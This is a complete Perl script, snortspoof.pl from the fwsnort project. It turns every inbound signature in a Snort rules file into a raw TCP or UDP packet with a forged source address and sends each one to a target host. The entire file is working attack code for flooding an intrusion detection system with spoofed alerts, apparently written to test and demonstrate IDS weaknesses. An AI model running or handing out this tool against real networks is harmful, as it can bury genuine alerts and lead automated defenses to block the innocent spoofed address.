#!/usr/bin/perl -w
#
# snortspoof.pl, by Michael Rash <mbr@cipherdyne.org>
# This software is released under the terms of the GPL, and
# is distributed with the fwsnort project.
#

use Net::RawIP;
use strict;

my $file       = $ARGV[0] || '';
my $spoof_addr = $ARGV[1] || '';
my $dst_addr   = $ARGV[2] || '';

die "$0 <rules file> <spoof IP> <dst IP>"
    unless $file and $spoof_addr and $dst_addr;

# alert udp $EXTERNAL_NET 60000 -> $HOME_NET 2140 \
# (msg:"BACKDOOR DeepThroat 3.1 Keylogger on Server ON"; \
# content:"KeyLogger Is Enabled On port"; reference:arachnids,106; \
# classtype:misc-activity; sid:165; rev:5;)
my $sig_sent = 0;
open F, "< $file" or die "[*] Could not open $file: $!";
SIG: while (<F>) {
    my $msg = '';
    my $content = '';
    my $conv_content = '';
    my $hex_mode = 0;
    my $proto = '';
    my $spt = 10000;
    my $dpt = 10000;

    ### make sure it is an inbound sig
    if (/^\s*alert\s+(tcp|udp)\s+\S+\s+(\S+)\s+\S+
            \s+(\$HOME_NET|any)\s+(\S+)\s/x) {
        $proto = $1;
        my $spt_tmp = $2;
        my $dpt_tmp = $4;

        ### can't handle multiple content fields yet
        next SIG if /content:.*\s*content\:/;

        $msg     = $1 if /\s*msg\:\"(.*?)\"\;/;
        $content = $1 if /\s*content\:\"(.*?)\"\;/;
        next SIG unless $msg and $content;

        if ($spt_tmp =~ /(\d+)/) {
            $spt = $1;
        } elsif ($spt_tmp ne 'any') {
            next SIG;
        }
        if ($dpt_tmp =~ /(\d+)/) {
            $dpt = $1;
        } elsif ($dpt_tmp ne 'any') {
            next SIG;
        }

        my @chars = split //, $content;
        for (my $i=0; $i<=$#chars; $i++) {
            if ($chars[$i] eq '|') {
                $hex_mode == 0 ? ($hex_mode = 1) : ($hex_mode = 0);
                next;
            }
            if ($hex_mode) {
                next if $chars[$i] eq ' ';
                $conv_content .= sprintf("%c",
                        hex($chars[$i] . $chars[$i+1]));
                $i++;
            } else {
                $conv_content .= $chars[$i];
            }
        }
        my $rawpkt = '';
        if ($proto eq 'tcp') {
            $rawpkt = new Net::RawIP({'ip' => {
                saddr => $spoof_addr, daddr => $dst_addr},
                'tcp' => { source => $spt, dest => $dpt, 'ack' => 1,
                data => $conv_content}})
                    or die "[*] Could not get Net::RawIP object: $!";
        } else {
            $rawpkt = new Net::RawIP({'ip' => {
                saddr => $spoof_addr, daddr => $dst_addr},
                'udp' => { source => $spt, dest => $dpt,
                data => $conv_content}})
                    or die "[*] Could not get Net::RawIP object: $!";
        }
        $rawpkt->send();
        $sig_sent++;
    }
}
print "[+] $file, $sig_sent attacks sent.\n";
close F;
exit 0;
